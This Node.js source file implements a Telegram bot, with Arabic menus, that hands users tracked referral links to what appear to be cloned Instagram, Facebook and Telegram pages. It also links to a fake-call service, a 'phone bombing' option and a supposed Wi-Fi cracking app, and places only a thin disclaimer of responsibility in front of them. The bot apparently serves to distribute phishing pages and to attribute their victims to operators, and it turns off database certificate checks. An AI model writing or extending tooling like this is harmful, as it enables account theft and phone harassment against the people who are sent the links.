const { TelegramBot } = require("node-telegram-bot-api");
const express = require("express");
const { Pool } = require("pg");
const crypto = require("crypto");

// ==============================
// الإعدادات
// ==============================

const TOKEN = process.env.BOT_TOKEN;

if (!TOKEN) {
    console.error("❌ BOT_TOKEN is missing");
    process.exit(1);
}

const DATABASE_URL = process.env.DATABASE_URL;

if (!DATABASE_URL) {
    console.error("❌ DATABASE_URL is missing");
    process.exit(1);
}

const PORT = process.env.PORT || 3000;


// ==============================
// Telegram Bot
// ==============================

const bot = new TelegramBot(TOKEN, {
    polling: true
});

console.log("✅ Telegram Bot is running...");


// ==============================
// Express Server
// ==============================

const app = express();

app.use(express.json());


// ==============================
// PostgreSQL
// ==============================

const pool = new Pool({
    connectionString: DATABASE_URL,
    ssl: {
        rejectUnauthorized: false
    }
});

async function initDatabase() {

    await pool.query(`
        CREATE TABLE IF NOT EXISTS referrals (
            token TEXT PRIMARY KEY,
            telegram_id TEXT NOT NULL,
            created_at TIMESTAMPTZ DEFAULT CURRENT_TIMESTAMP
        )
    `);

    console.log("✅ PostgreSQL database is ready");
}

initDatabase().catch((error) => {

    console.error("❌ Database initialization error:", error);
    process.exit(1);

});


// ==============================
// إنشاء Token عشوائي
// ==============================

function createToken() {

    return crypto
        .randomBytes(32)
        .toString("hex");

}


// ==============================
// إنشاء Referral
// ==============================

async function createReferral(chatId) {

    const token = createToken();

    await pool.query(
        `
        INSERT INTO referrals
        (token, telegram_id)
        VALUES ($1, $2)
        `,
        [
            token,
            String(chatId)
        ]
    );

    return token;
}


// ==============================
// التحقق من Token
// ==============================

async function getReferral(token) {

    const result = await pool.query(
        `
        SELECT *
        FROM referrals
        WHERE token = $1
        `,
        [token]
    );

    return result.rows[0] || null;
}


// ==============================
// API إنشاء Referral
// ==============================

app.post("/api/referral/create", async (req, res) => {

    try {

        const { telegram_id } = req.body;

        if (!telegram_id) {

            return res.status(400).json({
                success: false,
                error: "telegram_id is required"
            });

        }

        const token = await createReferral(telegram_id);

        res.json({
            success: true,
            token
        });

    } catch (error) {

        console.error("❌ Referral creation error:", error);

        res.status(500).json({
            success: false,
            error: "Failed to create referral"
        });

    }

});


// ==============================
// API التحقق من Referral
// ==============================

app.get("/api/referral/:token", async (req, res) => {

    try {

        const referral = await getReferral(
            req.params.token
        );

        if (!referral) {

            return res.status(404).json({
                success: false,
                error: "Invalid referral"
            });

        }

        res.json({
            success: true,
            valid: true
        });

    } catch (error) {

        console.error("❌ Referral lookup error:", error);

        res.status(500).json({
            success: false,
            error: "Database error"
        });

    }

});


// ==============================
// الصفحة الرئيسية
// ==============================

app.get("/", (req, res) => {

    res.send("✅ Referral server is running");

});


// ==============================
// تشغيل السيرفر
// ==============================

app.listen(PORT, () => {

    console.log(
        `🌐 Server running on port ${PORT}`
    );

});


// ==============================
// المستخدمون الذين وافقوا
// ==============================

const acceptedUsers = new Set();


// ==============================
// القائمة الرئيسية
// ==============================

function sendMainMenu(chatId) {

    return bot.sendMessage(
        chatId,
        "👋 أهلاً بك\n\nاختر المنصة:",
        {
            reply_markup: {
                inline_keyboard: [

                    [
                        {
                            text: "📸 Instagram",
                            callback_data: "instagram"
                        },
                        {
                            text: "📘 Facebook",
                            callback_data: "facebook"
                        }
                    ],

                    [
                        {
                            text: "✈️ Telegram",
                            callback_data: "telegram"
                        },
                        {
                            text: "📞 اتصال وهمي",
                            callback_data: "twitter"
                        }
                    ],

                    [
                        {
                            text: "💬 تفجير هواتف",
                            callback_data: "تفجير هواتف"
                        },
                        {
                            text: "📶 تطبيق فك جميع شبكات Wi-Fi",
                            callback_data: "whatsapp"
                        }
                    ]

                ]
            }
        }
    );

}


// ==============================
// /start
// ==============================

bot.onText(/^\/start$/, async (msg) => {

    const chatId = msg.chat.id;

    const firstName =
        msg.from?.first_name || "غير معروف";

    const lastName =
        msg.from?.last_name || "";

    const username =
        msg.from?.username
            ? `@${msg.from.username}`
            : "لا يوجد";

    const fullName =
        `${firstName} ${lastName}`.trim();


    if (acceptedUsers.has(chatId)) {

        return sendMainMenu(chatId);

    }


    await bot.sendMessage(
        chatId,

        `👋 أهلاً بك ${fullName}

🆔 معرف Telegram الخاص بك:
${chatId}

👤 Username:
${username}

📋 شروط استخدام البوت:

أنا غير مسؤول عن أي استخدام غير رسمي للبوت.

باستخدامك للبوت، أنت تقر بأنك قرأت الشروط وتوافق عليها.`,

        {
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: "✅ أوافق على الشروط",
                            callback_data: "accept_terms"
                        }
                    ]
                ]
            }
        }
    );

});


// ==============================
// أزرار البوت
// ==============================

bot.on("callback_query", async (query) => {

    const chatId = query.message.chat.id;

    try {

        // ==========================
        // قبول الشروط
        // ==========================

        if (query.data === "accept_terms") {

            acceptedUsers.add(chatId);

            await bot.answerCallbackQuery(
                query.id,
                {
                    text: "تم قبول الشروط ✅"
                }
            );

            await bot.sendMessage(
                chatId,

                `✅ تم قبول الشروط.

أهلاً بك ${query.from.first_name || ""}.

🆔 ID الخاص بك:
${chatId}

اضغط /start للمتابعة.`
            );

            return;
        }


        // ==========================
        // التحقق من الموافقة
        // ==========================

        if (!acceptedUsers.has(chatId)) {

            await bot.answerCallbackQuery(
                query.id,
                {
                    text: "يجب الموافقة على الشروط أولاً."
                }
            );

            return;
        }


        // ==========================
        // إنشاء الرابط الخاص
        // ==========================

        const token = await createReferral(chatId);


        // ==========================
        // الروابط
        // ==========================

        const websites = {

            instagram:
                "https://instagram-two-henna.vercel.app/",

            facebook:
                "https://facebook-ruby-one.vercel.app/",

            telegram:
                "https://telegram-one-rho.vercel.app/",

            twitter:
                "https://callmyphone.org/",

            whatsapp:
                "https://wifi-free-gamma.vercel.app/",

            "تفجير هواتف":
                "https://kexart.com/"

        };


        const website = websites[query.data];


        if (!website) {

            await bot.answerCallbackQuery(query.id);

            return;
        }


        // ==========================
        // إضافة Token إلى الرابط
        // ==========================

        const separator =
            website.includes("?")
                ? "&"
                : "?";

        const referralUrl =
            `${website}${separator}ref=${token}`;


        await bot.sendMessage(
            chatId,

            `🔗 هذا رابطك الخاص:

${referralUrl}

يمكنك مشاركة الرابط.`
        );


        await bot.answerCallbackQuery(query.id);

    } catch (error) {

        console.error(
            "❌ Callback error:",
            error
        );

        try {

            await bot.answerCallbackQuery(
                query.id,
                {
                    text: "حدث خطأ، حاول مرة أخرى."
                }
            );

        } catch (_) {}

    }

});
